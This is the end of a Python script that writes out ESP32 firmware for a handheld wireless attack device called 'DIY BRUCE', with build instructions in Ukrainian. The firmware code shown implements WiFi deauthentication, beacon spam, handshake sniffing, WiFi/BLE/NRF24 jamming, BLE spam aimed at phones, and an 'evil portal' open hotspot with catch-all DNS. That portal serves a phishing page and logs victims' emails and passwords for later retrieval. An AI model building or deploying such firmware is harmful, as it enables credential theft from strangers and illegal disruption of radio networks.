// ============================================================================
// ВЕБ-СЕРВЕР
// ============================================================================
const char index_html[] PROGMEM = R"rawliteral(INDEX_HTML)rawliteral";
const char portal_html[] PROGMEM = R"rawliteral(PORTAL_HTML)rawliteral";
const char tv_html[] PROGMEM = R"rawliteral(TV_HTML)rawliteral";

void startWebServer() {
    if (webRunning) return;
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    server.on("/", []() { server.send(200, "text/html", index_html); });
    server.on("/portal.html", []() { server.send(200, "text/html", portal_html); });
    server.on("/tv.html", []() { server.send(200, "text/html", tv_html); });
    server.on("/cmd", []() {
        if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
        String c = server.arg("c");
        if (c == "scan") scanWiFi();
        else if (c == "deauth") startDeauth();
        else if (c == "deauth_stop") stopDeauth();
        else if (c == "beacon") startBeacon();
        else if (c == "handshake") startHandshake();
        else if (c == "connect") selectWiFiNetwork();
        else if (c == "deauth_mac") deauthByMAC();
        else if (c == "wifi_jam") startWiFiJammer();
        else if (c == "wifi_jam_stop") stopWiFiJammer();
        else if (c == "blescan") bleScan();
        else if (c == "bleapple") bleApple();
        else if (c == "blesamsung") bleSamsung();
        else if (c == "bleandroid") bleAndroid();
        else if (c == "blewindows") bleWindows();
        else if (c == "bleall") bleAll();
        else if (c == "blejam") startBLEJammer();
        else if (c == "blejam_stop") stopBLEJammer();
        else if (c == "nrfscan") nrfScan();
        else if (c == "nrfjam") startNRFJammer();
        else if (c == "nrfjam_stop") stopNRFJammer();
        else if (c == "nrfinfo") nrfInfo();
        else if (c == "ir_samsung") irSamsung();
        else if (c == "ir_lg") irLG();
        else if (c == "ir_sony") irSony();
        else if (c == "ir_bravis") irBravis();
        else if (c == "ir_philips") irPhilips();
        else if (c == "ir_power") irPower();
        else if (c == "ir_volup") irVolUp();
        else if (c == "ir_voldown") irVolDown();
        else if (c == "ir_chup") irChUp();
        else if (c == "ir_chdown") irChDown();
        else if (c == "ir_mute") irMute();
        else if (c == "tv_power") irPower();
        else if (c == "tv_up") irChUp();
        else if (c == "tv_down") irChDown();
        else if (c == "tv_left") irVolDown();
        else if (c == "tv_right") irVolUp();
        else if (c == "tv_ok") showMessage("OK", 500);
        else if (c == "tv_back") showMessage("BACK", 500);
        else if (c == "tv_volup") irVolUp();
        else if (c == "tv_voldown") irVolDown();
        else if (c == "tv_chup") irChUp();
        else if (c == "tv_chdown") irChDown();
        else if (c == "tv_mute") irMute();
        else if (c == "evil") startEvil();
        else if (c == "evil_stop") stopEvil();
        else if (c == "evil_google") { evilChoice = "google"; showMessage("EVIL: Google", 500); }
        else if (c == "evil_facebook") { evilChoice = "facebook"; showMessage("EVIL: Facebook", 500); }
        else if (c.startsWith("key")) { if (server.hasArg("text")) keyboardInput = server.arg("text"); showMessage(("Text: " + keyboardInput).c_str(), 1000); }
        else if (c == "web_on") startWebServer();
        else if (c == "web_off") stopWebServer();
        else if (c == "bright") setBrightness();
        else if (c == "format") { capturedPasswords = ""; handshakes = ""; saveData(); showMessage("DATA CLEARED", 1000); }
        else if (c == "about") showSuccess("DIY BRUCE v25.0", "WiFi | BLE | NRF | IR | JAMMER");
        else if (c == "reset") reboot();
        else if (c == "getpass") { server.send(200, "text/plain", capturedPasswords); return; }
        else if (c == "gethand") { server.send(200, "text/plain", handshakes); return; }
        else if (c == "clear_pass") { capturedPasswords = ""; saveData(); }
        else if (c == "clear_hand") { handshakes = ""; saveData(); }
        else if (c == "export_csv") { String csv = "Timestamp,SSID,BSSID,RSSI,Channel\\n"; for (int i = 0; i < networkCount && i < 20; i++) { csv += String(millis()/1000) + "," + networkNames[i] + "," + WiFi.BSSIDstr(i) + "," + String(WiFi.RSSI(i)) + "," + String(networkChannel[i]) + "\\n"; } server.send(200, "text/csv", csv); }
        else if (c == "view_pass") { server.send(200, "text/plain", capturedPasswords); return; }
        else if (c == "view_hand") { server.send(200, "text/plain", handshakes); return; }
        else if (c == "packets_start") { showMessage("PACKET SNIFF", 1000); }
        else if (c == "packets_stop") { showMessage("PACKET STOP", 1000); }
        else if (c == "packets_export") { showMessage("PACKET EXPORT", 1000); }
        else if (c == "jam_stop") { stopWiFiJammer(); stopBLEJammer(); stopNRFJammer(); showMessage("ALL JAMMERS STOPPED", 1000); }
        server.send(200, "text/plain", "OK");
    });
    server.on("/data", []() {
        String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + 
                      ",\\"rssi\\":" + String(lastRSSI) + ",\\"blerssi\\":" + String(lastBLERSSI) + 
                      ",\\"uptime\\":" + String(millis()/1000) + "}";
        server.send(200, "application/json", json);
    });
    server.on("/pass", HTTP_POST, []() {
        String email = server.hasArg("email") ? server.arg("email") : "";
        String pwd = server.hasArg("pass") ? server.arg("pass") : "";
        if (email.length() > 0 || pwd.length() > 0) { capturedPasswords += "[PASS] Email:" + email + " Pass:" + pwd + "\\n"; saveData(); }
        server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
    });
    server.begin();
    webRunning = true;
    showSuccess("WEB SERVER", "192.168.4.1");
}

void stopWebServer() { server.stop(); WiFi.softAPdisconnect(true); webRunning = false; showSuccess("WEB STOPPED", ""); }

void startEvil() {
    if (evilActive) return;
    WiFi.softAP("FREE_WIFI", NULL);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    server.on("/", []() { server.send(200, "text/html", portal_html); });
    server.on("/pass", HTTP_POST, []() {
        String email = server.hasArg("email") ? server.arg("email") : "";
        String pwd = server.hasArg("pass") ? server.arg("pass") : "";
        if (email.length() > 0 || pwd.length() > 0) { capturedPasswords += "[EVIL] Email:" + email + " Pass:" + pwd + "\\n"; saveData(); }
        server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
    });
    server.begin();
    evilActive = true;
    showSuccess("EVIL PORTAL", "FREE_WIFI");
    while (evilActive) { dnsServer.processNextRequest(); server.handleClient(); if (checkButton(BTN_BACK)) evilActive = false; delay(100); }
    dnsServer.stop(); server.stop(); WiFi.softAPdisconnect(true); evilActive = false; showSuccess("EVIL STOPPED", "");
}
void stopEvil() { evilActive = false; }

void setBrightness() {
    uint8_t contrast = 200;
    while (true) {
        u8g2.clearBuffer(); drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40, 10, "BRIGHTNESS");
        u8g2.drawFrame(8, 32, 112, 12); u8g2.drawBox(8, 32, contrast * 112 / 255, 12);
        char buf[8]; sprintf(buf, "%d%%", contrast * 100 / 255);
        int w = u8g2.getStrWidth(buf); u8g2.drawStr((128 - w) / 2, 52, buf);
        u8g2.drawStr(8, 30, "<"); u8g2.drawStr(110, 30, ">");
        u8g2.drawStr(2, 62, "LR=change OK=save BACK=exit");
        u8g2.sendBuffer();
        if (checkButton(BTN_LEFT) && contrast > 10) contrast -= 10;
        else if (checkButton(BTN_RIGHT) && contrast < 255) contrast += 10;
        else if (checkButton(BTN_OK)) { u8g2.setContrast(contrast); showSuccess("SAVED!", ""); break; }
        else if (checkButton(BTN_BACK)) break;
        delay(50);
    }
}

void toolsKeyboard() { wifiKeyboard("ENTER TEXT:", keyboardInput, 50); showSuccess(("Saved: " + keyboardInput).c_str(), ""); }

// ============================================================================
// МЕНЮ
// ============================================================================
void drawMainMenu() {
    u8g2.clearBuffer(); drawTopBar();
    int prev = (currentModule - 1 + moduleCount) % moduleCount;
    int next = (currentModule + 1) % moduleCount;
    u8g2.drawXBM(2, 17, 24, 24, wifi_40);
    u8g2.drawXBM(102, 17, 24, 24, wifi_40);
    u8g2.drawRFrame(44, 12, 40, 40, 4);
    u8g2.drawXBM(48, 14, 32, 32, wifi_40);
    u8g2.setFont(u8g2_font_7x13B_tr);
    u8g2.drawStr(50, 58, modules[currentModule]);
    u8g2.drawStr(28, 36, "<"); u8g2.drawStr(93, 36, ">");
    u8g2.sendBuffer();
}

void drawSubMenu() {
    int size; const char** items; const char* title;
    switch (currentModule) {
        case 0: title = "WiFi"; items = wifiSub; size = wifiSize; break;
        case 1: title = "BLE"; items = bleSub; size = bleSize; break;
        case 2: title = "NRF24"; items = nrfSub; size = nrfSize; break;
        case 3: title = "IR TV"; items = irSub; size = irSize; break;
        case 4: title = "Tools"; items = toolsSub; size = toolsSize; break;
        default: title = "Settings"; items = settingsSub; size = settingsSize; break;
    }
    if (currentSubIndex < subScroll) subScroll = currentSubIndex;
    if (currentSubIndex >= subScroll + SUB_VISIBLE) subScroll = currentSubIndex - SUB_VISIBLE + 1;
    u8g2.clearBuffer(); drawTopBar();
    u8g2.drawBox(0, 11, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(2, 21, title);
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 23, 128, 23);
    for (int i = 0; i < SUB_VISIBLE && (subScroll + i) < size; i++) {
        int idx = subScroll + i;
        int y = 26 + i * 10;
        if (idx == currentSubIndex) {
            u8g2.drawBox(0, y-8, 128, 10);
            u8g2.setDrawColor(0);
            u8g2.drawXBM(2, y-6, 12, 12, folder_12);
            u8g2.drawXBM(16, y-6, 12, 12, scan_12);
            u8g2.setCursor(30, y);
            u8g2.print(items[idx]);
            u8g2.setDrawColor(1);
        } else {
            u8g2.drawXBM(2, y-6, 12, 12, folder_12);
            u8g2.drawXBM(16, y-6, 12, 12, scan_12);
            u8g2.setCursor(30, y);
            u8g2.print(items[idx]);
        }
    }
    if (size > SUB_VISIBLE) {
        int bh = max(5, (39 * SUB_VISIBLE) / size);
        int by = 23 + (subScroll * (39 - bh)) / max(1, size - SUB_VISIBLE);
        u8g2.drawBox(124, by, 3, bh);
    }
    u8g2.sendBuffer();
}

void executeAction() {
    switch (currentModule) {
        case 0:
            switch (currentSubIndex) {
                case 0: scanWiFi(); break; case 1: startDeauth(); break; case 2: startBeacon(); break;
                case 3: startHandshake(); break; case 4: startWiFiJammer(); break; case 5: startEvil(); break;
                case 6: startWebServer(); break; case 7: selectWiFiNetwork(); break; case 8: deauthByMAC(); break;
                case 9: stopWiFiJammer(); stopDeauth(); stopBeacon(); showMessage("ALL STOPPED", 1000); break;
                case 10: showMessage("WiFi INFO", 1000); break; case 11: reboot(); break;
            } break;
        case 1:
            switch (currentSubIndex) {
                case 0: bleScan(); break; case 1: bleApple(); break; case 2: bleSamsung(); break;
                case 3: bleAndroid(); break; case 4: bleWindows(); break; case 5: bleAll(); break;
                case 6: startBLEJammer(); break; case 7: showMessage("BLE INFO", 1000); break;
                case 8: stopBLEJammer(); break; case 9: reboot(); break;
            } break;
        case 2:
            switch (currentSubIndex) {
                case 0: nrfScan(); break; case 1: startNRFJammer(); break; case 2: nrfInfo(); break;
                case 3: stopNRFJammer(); break; case 4: reboot(); break;
            } break;
        case 3:
            switch (currentSubIndex) {
                case 0: irSamsung(); break; case 1: irLG(); break; case 2: irSony(); break;
                case 3: irBravis(); break; case 4: irPhilips(); break; case 5: irPower(); break;
                case 6: irVolUp(); break; case 7: irVolDown(); break; case 8: irChUp(); break;
                case 9: irChDown(); break; case 10: irMute(); break;
                case 11: showMessage("IR STOP", 500); break; case 12: reboot(); break;
            } break;
        case 4:
            switch (currentSubIndex) {
                case 0: toolsKeyboard(); break; case 1: showMessage("TOOLS INFO", 1000); break; case 2: reboot(); break;
            } break;
        case 5:
            switch (currentSubIndex) {
                case 0: setBrightness(); break; case 1: startWebServer(); break; case 2: stopWebServer(); break;
                case 3: showSuccess("PASSWORDS", capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "None"); break;
                case 4: showSuccess("HANDSHAKES", handshakes.length() ? handshakes.substring(0, 50).c_str() : "None"); break;
                case 5: capturedPasswords = ""; handshakes = ""; saveData(); showMessage("DATA CLEARED", 1000); break;
                case 6: showSuccess("DIY BRUCE v25.0", "WiFi | BLE | NRF | IR | JAMMER"); break; case 7: reboot(); break;
            } break;
    }
}

// ============================================================================
// SETUP & LOOP
// ============================================================================
void setup() {
    Serial.begin(115200);
    pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
    Wire.begin(I2C_SDA, I2C_SCL);
    u8g2.begin();
    u8g2.setContrast(200);
    loadData();
    uptimeStart = millis();
    bootAnimation();
    SPI.begin(18, 19, 23, NRF_CSN);
    radio.begin();
    irsend.begin();
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeSniffer);
    drawMainMenu();
    showMessage("READY", 1000);
}

void loop() {
    if (webRunning) server.handleClient();
    if (evilActive) { dnsServer.processNextRequest(); server.handleClient(); }
    lastRSSI = WiFi.RSSI();
    if (!inSubMenuFlag) {
        if (checkButton(BTN_LEFT)) { currentModule = (currentModule - 1 + moduleCount) % moduleCount; drawMainMenu(); }
        else if (checkButton(BTN_RIGHT)) { currentModule = (currentModule + 1) % moduleCount; drawMainMenu(); }
        else if (checkButton(BTN_OK) || checkButton(BTN_DOWN)) { animateSlideDown(); inSubMenuFlag = true; currentSubIndex = 0; subScroll = 0; drawSubMenu(); }
    } else {
        int size = (currentModule==0?wifiSize:currentModule==1?bleSize:currentModule==2?nrfSize:currentModule==3?irSize:currentModule==4?toolsSize:settingsSize);
        if (checkButton(BTN_UP)) { currentSubIndex = (currentSubIndex - 1 + size) % size; drawSubMenu(); }
        else if (checkButton(BTN_DOWN)) { currentSubIndex = (currentSubIndex + 1) % size; drawSubMenu(); }
        else if (checkButton(BTN_OK)) { executeAction(); drawSubMenu(); }
        else if (checkButton(BTN_BACK)) { animateSlideUp(); inSubMenuFlag = false; drawMainMenu(); }
    }
    delay(20);
}
'''

# ============================================================================
# ФУНКЦІЯ СТВОРЕННЯ ПРОЄКТУ
# ============================================================================
def create_project():
    base = PROJECT_NAME
    if os.path.exists(base): shutil.rmtree(base)
    os.makedirs(os.path.join(base, "src"))
    os.makedirs(os.path.join(base, "include"))
    os.makedirs(os.path.join(base, "data"))
    
    with open(os.path.join(base, "platformio.ini"), "w", encoding="utf-8") as f: f.write(PLATFORMIO_INI)
    with open(os.path.join(base, "include", "CONFIG.h"), "w", encoding="utf-8") as f: f.write(CONFIG_H)
    with open(os.path.join(base, "include", "display.h"), "w", encoding="utf-8") as f: f.write(DISPLAY_H)
    with open(os.path.join(base, "include", "hydra_logo.h"), "w", encoding="utf-8") as f: f.write(HYDRA_LOGO_H)
    with open(os.path.join(base, "include", "icons.h"), "w", encoding="utf-8") as f: f.write(ICONS_H)
    with open(os.path.join(base, "include", "interface.h"), "w", encoding="utf-8") as f: f.write(INTERFACE_H)
    with open(os.path.join(base, "include", "ir_codes.h"), "w", encoding="utf-8") as f: f.write(IR_CODES_H)
    with open(os.path.join(base, "data", "index.html"), "w", encoding="utf-8") as f: f.write(INDEX_HTML)
    with open(os.path.join(base, "data", "portal.html"), "w", encoding="utf-8") as f: f.write(PORTAL_HTML)
    with open(os.path.join(base, "data", "tv.html"), "w", encoding="utf-8") as f: f.write(TV_HTML)
    with open(os.path.join(base, "src", "main.cpp"), "w", encoding="utf-8") as f: f.write(MAIN_CPP)
    
    print("=" * 70)
    print(f"✅ ПРОЄКТ СТВОРЕНО: {os.path.abspath(base)}")
    print("=" * 70)
    print("📁 СТРУКТУРА:")
    print("   DIY_BRUCE_FULL/")
    print("   ├── platformio.ini")
    print("   ├── src/main.cpp")
    print("   ├── include/")
    print("   │   ├── CONFIG.h")
    print("   │   ├── display.h")
    print("   │   ├── hydra_logo.h")
    print("   │   ├── icons.h")
    print("   │   ├── interface.h")
    print("   │   └── ir_codes.h")
    print("   └── data/")
    print("       ├── index.html (13 сторінок)")
    print("       ├── portal.html (Evil Portal)")
    print("       └── tv.html (TV Remote)")
    print("=" * 70)
    print("🚀 ФУНКЦІЇ:")
    print("   ✅ WiFi: SCAN, DEAUTH, BEACON, HANDSHAKE, JAM, EVIL, WEB, CONNECT")
    print("   ✅ BLE: SCAN, APPLE, SAMSUNG, ANDROID, WINDOWS, ALL, JAM")
    print("   ✅ NRF24: SCAN, JAM, INFO")
    print("   ✅ IR TV: SAMSUNG, LG, SONY, BRAVIS, PHILIPS, POWER, VOL+/-, CH+/-, MUTE")
    print("   ✅ JAMMER: WiFi, BLE, NRF")
    print("   ✅ Evil Portal, Handshake, Passwords, Graphs, Keyboard")
    print("=" * 70)
    print("🚀 ЯК ЗБІРАТИ:")
    print("   1. Відкрийте папку в VS Code")
    print("   2. PlatformIO → Build")
    print("   3. PlatformIO → Upload")
    print("   4. Підключіться до WiFi 'DIY_BRUCE' (пароль: bruce1234)")
    print("   5. Відкрийте браузер → 192.168.4.1")
    print("=" * 70)

if __name__ == "__main__":
    create_project()
